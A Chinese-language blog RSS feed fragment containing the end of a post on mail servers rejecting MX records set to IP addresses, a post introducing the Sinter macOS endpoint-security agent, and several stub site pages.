&lt;p&gt;我使用的邮件服务器（Courier）对此限制较严格，因此时常因此无法发送邮件。虽然发生频率不高，但确实存在。若您的邮件服务器存在此类配置，可能会错过部分合法邮件。&lt;/p&gt;
&lt;p&gt;希望通过本文提高认知并推动修复。具体建议如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;邮件/DNS服务器管理员&lt;/strong&gt;：请严格使用域名配置MX记录&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IT服务提供商&lt;/strong&gt;：应将此检查纳入定期审计清单（&lt;a class=&#34;link&#34; href=&#34;https://example.com/script.py&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;附Python检测脚本&lt;/a&gt;）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;检测工具开发者&lt;/strong&gt;：建议增加MX记录IP地址检测功能。目前仅Hardenize和IntoDNS等少数服务会警告此类问题。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;我对Alexa Top 100万网站进行了快速扫描，约0.06%存在此问题（如果您认识相关责任人，请分享本文）。后续可能通过postmaster别名联系这些域名管理者。&lt;/p&gt;
&lt;p&gt;（图片来源：nohat.cc / CC0协议）&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;技术讨论精选&#34;&gt;技术讨论精选
&lt;/h2&gt;&lt;h3 id=&#34;评论1---erwin-hoffmann&#34;&gt;评论#1 - Erwin Hoffmann
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;配置错误实际源于DNS负责人而非邮件服务器&lt;/li&gt;
&lt;li&gt;仅IPv4地址可能被误用（语法与域名相似）&lt;/li&gt;
&lt;li&gt;DNS软件应增加输入验证机制&lt;/li&gt;
&lt;li&gt;完整MX配置需包含：
&lt;ul&gt;
&lt;li&gt;域名&lt;/li&gt;
&lt;li&gt;权重值&lt;/li&gt;
&lt;li&gt;对应A/AAAA记录&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;现代互联网还需配置：
&lt;ul&gt;
&lt;li&gt;反向DNS&lt;/li&gt;
&lt;li&gt;SPF记录&lt;/li&gt;
&lt;li&gt;TLSA记录&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;评论2---spongebob&#34;&gt;评论#2 - Spongebob
&lt;/h3&gt;&lt;p&gt;使用IP地址将导致无法配置DKIM/DMARC（MX名称需匹配SSL证书）&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;作者回复&lt;/strong&gt;：此问题实际与MTA-STS相关（需验证主机名证书）&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>归档</title>
        <link>http://localhost:1313/archives/</link>
        <pubDate>Tue, 28 May 2019 00:00:00 +0000</pubDate>
        
        <guid>http://localhost:1313/archives/</guid>
        <description></description>
        </item>
        <item>
        <title>Sinter：macOS全新用户态安全执行框架解析</title>
        <link>http://localhost:1313/p/sintermacos%E5%85%A8%E6%96%B0%E7%94%A8%E6%88%B7%E6%80%81%E5%AE%89%E5%85%A8%E6%89%A7%E8%A1%8C%E6%A1%86%E6%9E%B6%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
        
        <guid>http://localhost:1313/p/sintermacos%E5%85%A8%E6%96%B0%E7%94%A8%E6%88%B7%E6%80%81%E5%AE%89%E5%85%A8%E6%89%A7%E8%A1%8C%E6%A1%86%E6%9E%B6%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;sintermacos全新用户态安全执行框架&#34;&gt;Sinter：macOS全新用户态安全执行框架
&lt;/h1&gt;&lt;h2 id=&#34;简单开源且基于swift&#34;&gt;简单、开源且基于Swift
&lt;/h2&gt;&lt;p&gt;Sinter是我们用Swift编写的开源macOS端点安全执行代理（支持10.15及以上系统）。它完全基于用户态构建，利用新的EndpointSecurity API接收macOS内核发出的安全事件回调。通过简单规则即可控制事件允许/拒绝，无需传统杀毒软件的全盘扫描或特征检测。&lt;/p&gt;
&lt;h2 id=&#34;纯用户态安全代理的探索&#34;&gt;纯用户态安全代理的探索
&lt;/h2&gt;&lt;p&gt;实现端点安全解决方案需要实时拦截和授权OS级事件。过去这意味着使用内核态回调API或直接挂钩内核代码。苹果在2019年末宣布将弃用所有第三方内核扩展，引入EndpointSecurity API作为替代方案。&lt;/p&gt;
&lt;h2 id=&#34;endpointsecurity-api解析&#34;&gt;EndpointSecurity API解析
&lt;/h2&gt;&lt;p&gt;该API实现了macOS内核的实时回调机制，支持NOTIFY（通知）和AUTH（授权）两种事件类型。它取代了原有的Kauth KPI等内核态方案，成为macOS 11 Big Sur后唯一合法的实时监控接口。&lt;/p&gt;
&lt;h2 id=&#34;sinter开发中的关键技术挑战&#34;&gt;Sinter开发中的关键技术挑战
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;实时决策不影响系统性能&lt;/strong&gt;&lt;br&gt;
采用异步处理架构，通过&lt;code&gt;es_copy_message&lt;/code&gt;解耦消息处理，建立双优先级队列（常规程序和大程序分离），确保系统响应能力。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;防范TOCTOU竞态条件&lt;/strong&gt;&lt;br&gt;
针对&amp;quot;检查时-使用时&amp;quot;时间差攻击，实现文件事件监控机制。当检测到执行文件被篡改时立即清除缓存（已向苹果提交改进建议FB8352031）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;应用包代码签名验证&lt;/strong&gt;&lt;br&gt;
macOS可执行文件存在于应用包（.app）中，需验证整个包的签名。Sinter创新性地实现双缓存机制：EndpointSecurity原生缓存+自定义应用包验证缓存。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;系统扩展安装优势&lt;/strong&gt;&lt;br&gt;
作为System Extension部署可获得系统级保护（包括SIP扩展防护），防止root用户卸载。未来版本将迁移到此模式。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;证书签名与公证流程&lt;/strong&gt;&lt;br&gt;
建立自动化CMake工作流处理苹果严格的代码签名、公证和权限申请（EndpointSecurity权限需6周人工审核）。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;未来展望&#34;&gt;未来展望
&lt;/h2&gt;&lt;p&gt;Sinter将持续增强规则引擎灵活性，整合文件完整性监控、内存注入防护（通过mmap事件分析）及NetworkExtension网络流量控制。我们欢迎社区通过GitHub或Empire Hacking Slack频道参与贡献。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;随着内核扩展的弃用，苹果为端点防护建立了统一用户态API标准，这将提升系统稳定性并减少攻击面，而Swift语言的选择确保了长期兼容性优势。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>关于</title>
        <link>http://localhost:1313/%E5%85%B3%E4%BA%8E/</link>
        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
        
        <guid>http://localhost:1313/%E5%85%B3%E4%BA%8E/</guid>
        <description>&lt;p&gt;更多精彩内容 请关注我的个人公众号&lt;/p&gt;
&lt;p&gt;公众号（办公AI智能小助手）&lt;/p&gt;
&lt;p&gt;公众号二维码&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgs.ovh/2025/06/21/AejG6.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>搜索</title>
        <link>http://localhost:1313/search/</link>
        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
        
        <guid>http://localhost:1313/search/</guid>
        <description></description>
        </item>
        <item>
        <title>友链</title>
        <link>http://localhost:1313/%E5%8F%8B%E9%93%BE/</link>
        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
        
        <guid>http://localhost:1313/%E5%8F%8B%E9%93%BE/</guid>
        <description>&lt;p&gt;To use this feature, add &lt;code&gt;links&lt;/code&gt; section to frontmatter.&lt;/p&gt;
&lt;p&gt;This page&amp;rsquo;s frontmatter:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;links&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;GitHub&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;description&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;GitHub is the world&amp;#39;s largest software development platform.&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;website&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;https://github.com&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;image&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;TypeScript&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;description&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;TypeScript is a typed superset of JavaScript that compiles to plain JavaScript.&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;website&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;https://www.typescriptlang.org&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;image&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;ts-logo-128.jpg&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;code&gt;image&lt;/code&gt; field accepts both local and external images.&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
